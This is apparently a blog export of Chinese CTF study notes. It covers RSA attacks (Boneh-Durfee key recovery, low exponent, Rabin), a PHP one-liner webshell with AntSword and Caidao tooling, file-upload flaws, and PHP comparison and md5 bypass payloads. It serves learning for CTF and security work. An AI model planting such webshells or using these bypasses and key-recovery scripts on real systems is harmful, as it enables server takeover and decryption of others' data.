= pol1.resultant(pol2)<br><br>            <span class="hljs-comment"># are these good polynomials?</span><br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="hljs-string">&quot;and&quot;</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    rr = rr(q, q)<br><br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Your prediction (delta) is too small&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-keyword">return</span> solx, soly<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">example</span>():</span><br>    <span class="hljs-comment">############################################</span><br>    <span class="hljs-comment"># How To Use This Script</span><br>    <span class="hljs-comment">##########################################</span><br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># The problem to solve (edit the following values)</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># the modulus</span><br>    N = <span class="hljs-number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span><br>    <span class="hljs-comment"># the public exponent</span><br>    e = <span class="hljs-number">93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span><br><br>    <span class="hljs-comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span><br>    delta = <span class="hljs-number">0.280</span> <span class="hljs-comment"># this means that d &lt; N^delta</span><br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Lattice (tweak those values)</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span><br>    m = <span class="hljs-number">4</span> <span class="hljs-comment"># size of the lattice (bigger the better/slower)</span><br><br>    <span class="hljs-comment"># you need to be a lattice master to tweak these</span><br>    t = <span class="hljs-built_in">int</span>((<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*delta) * m)  <span class="hljs-comment"># optimization from Herrmann and May</span><br>    X = <span class="hljs-number">2</span>*floor(N^delta)  <span class="hljs-comment"># this _might_ be too much</span><br>    Y = floor(N^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>))    <span class="hljs-comment"># correct if p, q are ~ same size</span><br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Don&#x27;t touch anything below</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># Problem put in equation</span><br>    P.&lt;x,y&gt; = PolynomialRing(ZZ)<br>    A = <span class="hljs-built_in">int</span>((N+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)<br>    pol = <span class="hljs-number">1</span> + x * (A + y)<br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Find the solutions!</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># Checking bounds</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== checking values ===&quot;</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* delta:&quot;</span>, delta)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="hljs-number">0.292</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* size of e:&quot;</span>, <span class="hljs-built_in">int</span>(log(e)/log(<span class="hljs-number">2</span>)))<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* size of N:&quot;</span>, <span class="hljs-built_in">int</span>(log(N)/log(<span class="hljs-number">2</span>)))<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* m:&quot;</span>, m, <span class="hljs-string">&quot;, t:&quot;</span>, t)<br><br>    <span class="hljs-comment"># boneh_durfee</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== running algorithm ===&quot;</span>)<br>        start_time = time.time()<br><br>    solx, soly = boneh_durfee(pol, e, m, t, X, Y)<br><br>    <span class="hljs-comment"># found a solution?</span><br>    <span class="hljs-keyword">if</span> solx &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== solution found ===&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">False</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;x:&quot;</span>, solx)<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;y:&quot;</span>, soly)<br><br>        d = <span class="hljs-built_in">int</span>(pol(solx, soly) / e)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;private key found:&quot;</span>, d)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== no solution was found ===&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    example() <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13781056?spm_id_from=333.999.0.0">https://www.bilibili.com/read/cv13781056?spm_id_from=333.999.0.0</a></p><p>sage还不知道咋用</p><hr><h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h2><p>e很小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de</span>(<span class="hljs-params">c, e, n</span>):</span><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        mm = c + n*k<br>        result, flag = gmpy2.iroot(mm, e)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == flag:<br>            <span class="hljs-keyword">return</span> result<br>        k += <span class="hljs-number">1</span><br>n= <span class="hljs-number">14067473525623615859223663589118945198091192669401088734569589535726733244095067264729942915265175903139441309376381225701454902095234966599914234681888481774607095853830772571665038109641511499155604914228117882196188074964226780922239011682486198651997912713999544628177959592818928976240251790858062449396082494272361535640237914373270152455829541596341184902017633404494979208958080467979235974182507427501682492000572071306960595992848840147393057648929439822116261337091431441205378542080755128597543738922210525692259529009107645032171097155449558362749512243918901171631681472217935131865121871798425854707759</span><br>e= <span class="hljs-number">3</span><br>c= <span class="hljs-number">2217344750798294937344050117513831761010547351781457575945714176628679412650463329423466955026804439931765627111856888102133234836914006818023839994342283023142702993182665344445325734299047409223354338948863171846780674244925724334091153701697864918695050507247415283070309</span><br><br>m=de(c,e,n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode()) <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13394072?spm_id_from=333.999.0.0">https://www.bilibili.com/read/cv13394072?spm_id_from=333.999.0.0</a> </p><hr><h2 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h2><p>e一定等于2</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">from gmpy2 <span class="hljs-built_in">import</span> *<br><span class="hljs-built_in">import</span> libnum<br><span class="hljs-built_in">import</span> hashlib<br><span class="hljs-attr">p=275127860351348928173285174381581152299</span><br><span class="hljs-attr">q=319576316814478949870590164193048041239</span><br><span class="hljs-attr">n=87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="hljs-attr">e=2</span><br><span class="hljs-attr">c=45617141162985597041928941111553655146539175146765096976546144304138540198644</span><br><span class="hljs-attr">inv_p</span> = invert(p, q)<br><span class="hljs-attr">inv_q</span> = invert(q, p)<br><span class="hljs-attr">mp</span> = pow(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br><span class="hljs-attr">mq</span> = pow(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><span class="hljs-attr">a</span> = (inv_p * p * mq + inv_q * q * mp) % n<br><span class="hljs-attr">b</span> = n - int(a)<br><span class="hljs-attr">c</span> = (inv_p * p * mq - inv_q * q * mp) % n<br><span class="hljs-attr">d</span> = n - int(c)<br><span class="hljs-comment">#因为rabin 加密有四种结果，全部列出。</span><br><span class="hljs-attr">aa=[a,b,c,d]</span><br>for i <span class="hljs-keyword">in</span> aa:<br>    print(i)<br>    print(libnum.n2s(int(i))) <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13467317?spm_id_from=333.999.0.0">https://www.bilibili.com/read/cv13467317?spm_id_from=333.999.0.0</a> </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nix">from Crypto.PublicKey <span class="hljs-built_in">import</span> RSA<br><span class="hljs-built_in">import</span> libnum<br><span class="hljs-built_in">import</span> gmpy2<br><span class="hljs-comment">#导入公钥</span><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;pubkey.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:<br>    <span class="hljs-attr">key</span> = RSA.import_key(f.read())<br>    <span class="hljs-attr">n</span> =key.n<br>    <span class="hljs-attr">e</span> =key.e<br><span class="hljs-comment">#导入密文</span><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:<br>    <span class="hljs-attr">c=libnum.s2n(f.read())</span><br><br>print(n)<br>print(e)<br><span class="hljs-comment">#n 在线分解</span><br><span class="hljs-attr">p=275127860351348928173285174381581152299</span><br><span class="hljs-attr">q=319576316814478949870590164193048041239</span><br><span class="hljs-attr">inv_p</span> = gmpy2.invert(p, q)<br><span class="hljs-attr">inv_q</span> = gmpy2.invert(q, p)<br><span class="hljs-attr">mp</span> = pow(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br><span class="hljs-attr">mq</span> = pow(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><span class="hljs-attr">a</span> = (inv_p * p * mq + inv_q * q * mp) % n<br><span class="hljs-attr">b</span> = n - int(a)<br><span class="hljs-attr">c</span> = (inv_p * p * mq - inv_q * q * mp) % n<br><span class="hljs-attr">d</span> = n - int(c)<br><span class="hljs-comment">#因为rabin 加密有四种结果，全部列出。</span><br><span class="hljs-attr">aa=[a,b,c,d]</span><br>for i <span class="hljs-keyword">in</span> aa:<br>    <span class="hljs-comment"># print(i)</span><br>    print(libnum.n2s(int(i))) <br></code></pre></td></tr></table></figure><p><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_e_attack/">公钥指数相关攻击 - CTF Wiki (ctf-wiki.org)</a></p><hr><h2 id="当e和phi不互素"><a href="#当e和phi不互素" class="headerlink" title="当e和phi不互素"></a>当e和phi不互素</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">x = gmpy2.gcd(phi, e)<br>d = gmpy2.invert(e // x, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = gmpy2.iroot(m, x)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(flag)))<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webshell与文件上传漏洞</title>
      <link href="/2022/01/23/webshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/01/23/webshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="🎄webshell"><a href="#🎄webshell" class="headerlink" title="🎄webshell"></a><font id=1><strong>🎄webshell</strong></font></h2><p>🎄<font size=4 color=orange id=2><strong>什么是webshell</strong></font><br>webshell，简称网页后门，简单来说它是<font color=red>运行在web应用之上的远程控制程序</font></p><p>webshell其实就是一张网页，由PHP、JSP、ASP、APS.NET等这类web应用程序语言开发，但webshell并不具备常见网页的登录，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息的功能。拥有比较完整功能的webshell，我们一般称之为<font color=red>大马</font>。功能简易的webshell称为<font color=red>小马</font>。除此之外还有一句话木马、菜刀马、脱裤马、内存马等等的名词，是对于webshell功能或特性的简称。</p><p>大马界面    <figure class="figure-image">      <img src="/picture/web4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  </p><p>🎄<font size=4 color=orange id=3><strong>php一句话木马</strong></font></p><p><code>&lt;?php @eval($_POST[x]);?&gt;</code></p><p>@是错误控制运算符，当@放置在一个php表达式之前，该表达式可能产生的任何错误信息都将被忽略。<br>$_POST也可以改成$__GET或$_REQUEST，根据需求选择<br>例如：对该webshell发送一个POST请求，请求内容为x=phpinfo()</p>    <figure class="figure-image">      <img src="/picture/web5.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>在根目录下新建一个php文档，把一句话木马写进去。<br>打开网站，post请求</p>    <figure class="figure-image">      <img src="/picture/web6 .png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>或者也可以尝试一些其他请求x=system(‘dir’);</p><p>🎄<font size=4 color=orange id=4><strong>webshell管理工具</strong></font></p><p>中国蚁剑是一款webshell管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。中国蚁剑的核心代码模块均改版自伟大的中国菜刀。</p>    <figure class="figure-image">      <img src="/picture/web7.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>一句话木马中的post参数就是为连接密码</p><p>中国蚁剑不支持edu.cn的域名，这是可以选用其他的webshell管理工具（中国菜刀、哥斯拉）</p><h2 id="🎄文件上传漏洞"><a href="#🎄文件上传漏洞" class="headerlink" title="🎄文件上传漏洞"></a><font id=1><strong>🎄文件上传漏洞</strong></font></h2><p>文件上传的功能是将<font color=red>文本文件上传至服务器</font>进行保存</p><p>文件上传漏洞是指文件上传功能<font color=red>没有对上传的文件进行合理严谨的过滤</font>，导致用户可以利用此功能，上传能<font color=red>被服务器解析执行的文件</font>，并通过此文件获得<font color=red>执行服务器端命令的能力。</font><br>（例如，如果对方是LAMP架构，是否能上传PHP的webshell到服务器端，然后通过访问上传后的文件地址，从而执行webshell中的代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础题型</title>
      <link href="/2022/01/22/web%E5%9F%BA%E7%A1%80%E9%A2%98%E5%9E%8B/"/>
      <url>/2022/01/22/web%E5%9F%BA%E7%A1%80%E9%A2%98%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-erge-函数-00截断漏洞"><a href="#PHP-erge-函数-00截断漏洞" class="headerlink" title="PHP.erge()函数%00截断漏洞"></a>PHP.erge()函数%00截断漏洞</h2><p>erge()用途<br>用指定的模式匹配一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false。搜索字母的字符是大小写敏感的。可选的参数规则包含一个数组的所有匹配表达式，它们被正则表达式的括号分组。<br>ereg(“^[0-9]+$“,$_<em>GET[‘password’])===true</em>#保证参数全是数字<br>strpos($_GET[‘password’],’admin’) #查找admin第一次在参数中出现的位置</p>    <figure class="figure-image">      <img src="/picture/web3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>可以构造payload<br>?password=111%00admin      #因为ereg函数%00截断</p><h2 id="PHP-sha1-函数漏洞"><a href="#PHP-sha1-函数漏洞" class="headerlink" title="PHP.sha1()函数漏洞"></a>PHP.sha1()函数漏洞</h2><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以’0E’开头的，那么PHP会认为它们是相同的，都是0.<br>常见的sha1后以0E开头的值有aa3OFF9m、aaroZmOk、aaO8zKZF</p><h2 id="弱类型问题"><a href="#弱类型问题" class="headerlink" title="弱类型问题"></a>弱类型问题</h2><p>=== 在进行比较时，会先判断两种字符串类型是否相等，再比较<br>== 在进行比较时，会先将字符串类型转化为相同，再比较</p><p>如果比较一个数字和一个字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且按照数值来进行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>var_dump(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true   //admin和数字进行比较，admin会转换成数字，转换成0</span><br>var_dump(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>);  <span class="hljs-comment">//true</span><br>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>);  <span class="hljs-comment">//false</span><br>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br>var_dump(<span class="hljs-string">&quot;0e1234&quot;</span>==<span class="hljs-string">&quot;0e3455&quot;</span>);  <span class="hljs-comment">//true    //虽然是两个字符串在进行比较，因为这个是科学计数法，字符串是科学计数法的形式，还是会转换成数字</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>字符串转换成数字规则(从几个例子中总结规则)<br>123admin -&gt; 123<br>123a1233  -&gt; 123<br>admin  -&gt; 0</p><p><font size=2>来个例题试一下</font></p>    <figure class="figure-image">      <img src="/picture/web8.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>POST传参messgae={“key”:0} ，因为$key是字符串，当它和数字比较会转换为数字，我们不妨猜测它不是数字开头的，拿到flag</p><p>再思考，如果这个$key以数字开头怎么办，那就抓包然后用burpsuit爆破它就可以了（或者用requess模块写脚本）</p>    <figure class="figure-image">      <img src="/picture/web9.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <h2 id="Md5绕过"><a href="#Md5绕过" class="headerlink" title="Md5绕过"></a>Md5绕过</h2><p>1、</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span><br><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-variable">$a</span>)</span></span> == md5(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure>    <figure class="figure-image">      <img src="/picture/web10.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>取a、b为任意两个md5值以0e开头的原值即可</p><p><a href="https://blog.csdn.net/qq_38603541/article/details/97108663?ops_request_misc=%7B%22request_id%22:%22164316559516780366519228%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164316559516780366519228&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-97108663.pc_search_result_control_group&utm_term=md5%E5%80%BC%E4%B8%BA0e%E5%BC%80%E5%A4%B4&spm=1018.2226.3001.4187">常见的MD5碰撞：md5值为0e开头_烟雨天青色-CSDN博客_md5值0e开头</a></p><p>2、</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span><br>md5(<span class="hljs-variable">$a</span>) === md5(<span class="hljs-variable">$b</span>)   <span class="hljs-regexp">//</span>注意这次是三个等号<br></code></pre></td></tr></table></figure><p>让a、b为数组（数组的md5值为NULL)<br>null === null   ,  md5(array) =&gt; null<br>a=[1,2]<br>b=array(0=&gt; ‘abc’)   //没有别的意思，只是生成数组的一个函数</p><p>$_GET[x]<br>?a[]=xyz  //这样就传入一个数组了<br>?a[]=xyz &amp; b[]=asd &amp; c[]=wu    //用&amp;连接符</p><p>3、</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(<span class="hljs-built_in">string</span>)$a != (<span class="hljs-built_in">string</span>)$b<br>md5($a) === md5($b)<br></code></pre></td></tr></table></figure><p>现在用数组就不行了，md5碰撞，因为md5的值总数是有限的，所有会有不同的数md5值相同</p><blockquote><p><a href="https://www.bilibili.com/video/BV1M54y1q7Wc?spm_id_from=333.999.0.0">视频链接</a>，我是跟着这个视频学的</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/01/22/hgame%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2022/01/22/hgame%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>各种编码特征</title>
      <link href="/2022/01/18/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E7%89%B9%E5%BE%81/"/>
      <url>/2022/01/18/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<p>1、jsfuck<br> 组成：[] () + !<br>示例：[][(![]+[])[+[]]+([![]]+[][[]]</p><p>2、brainfuck<br>组成：+-[].&lt;&gt;<br>示例：++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]++.&gt;+.+++++++…+++.&gt;++.&lt;&lt;+++++++++++++++…+++.——.——–.&gt;+.&gt;</p><p>3、Ook编码：Ook! Ook!</p><p>4、培根<br>只有两种字符<br>每一段的长度为 5</p><p>5、base家族<br>base64：大小写字母，0~9，+，-,64位组成的<br>base32：使用32个可打印字符（字母A-Z和数字2-7）<br>base16：使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。<br>base36：使用0~9的数字，加上所有26个字母，所有的字母要不全大写，要不全小写。<br>base58：58=9个阿拉伯数字（去掉0）+24个大写字母（去掉I和O）+25小写字母（去掉l）<br>base62：由10个数字、26个大写英文字母和26个小写英文字母组成<br>base85：:d]&gt;JA62bf&lt;^o]!;,or.=a;i@9/17‘@8oNU<br>base91:从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建base91字母：- (破折号，0x2D)     \（反斜杠，0x5C）     ‘（撇号，0x27）<br>base92:比base91 多一个字符 〜</p><p>6、敲击码<br>敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p>    <figure class="figure-image">      <img src="/picture/c5.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>7、url编码<br>特征：一个字符ascii码的十六进制，然后在前面加上%</p><p>任何特殊的字符（就是那些不是简单的七位ASCII，如汉字，当然也包括象 =,&amp;；，和 % 这些特殊的字符）将以百分符%用十六进制编码。</p><p>其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。汉字的url编码呢？看例子：“胡”的ascii码是-17670，十六进制是BAFA，url编码是“%BA%FA”。</p><p>8、shellcode编码<br>源文本：The quick brown fox jumps over the lazy dog<br>编码后：\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</p><p>9、Quoted-printable 编码<br>它是多用途互联网邮件扩展（MIME) 一种实现方式<br>示例：=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7</p><p>10、Unicode编码<br>Unicode编码有以下四种编码方式：<br>源文本： The<br>&amp;#x [Hex]： The<br>&amp;# [Decimal]： The<br>\U [Hex]： \U0054\U0068\U0065<br>\U+ [Hex]： \U+0054\U+0068\U+0065</p><blockquote><p>参考博客 <a href="https://blog.csdn.net/weixin_44255856/article/details/89792997?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164268994116780271586776%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164268994116780271586776&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89792997.pc_search_result_control_group&utm_term=ctf%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81&spm=1018.2226.3001.4187">这篇</a>、<a href="https://blog.csdn.net/weixin_54515836/article/details/113357816?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164268628416780366556635%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164268628416780366556635&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-113357816.pc_search_result_control_group&utm_term=ctf%E7%9B%B2%E6%96%87&spm=1018.2226.3001.4187">这篇</a>、<a href="https://www.cnblogs.com/daban/p/5680451.html">这篇</a><a href="https://blog.csdn.net/qq_42764617/article/details/106265909?ops_request_misc=%7B%22request_id%22:%22164317295816780261911583%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164317295816780261911583&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-7-106265909.pc_search_result_control_group&utm_term=%E5%85%94%E5%AD%90%E7%BC%96%E7%A0%81&spm=1018.2226.3001.4449">和这篇</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA小学生刷题</title>
      <link href="/2022/01/15/RSA%E5%B0%8F%E5%AD%A6%E7%94%9F%E5%88%B7%E9%A2%98/"/>
      <url>/2022/01/15/RSA%E5%B0%8F%E5%AD%A6%E7%94%9F%E5%88%B7%E9%A2%98/</url>
      
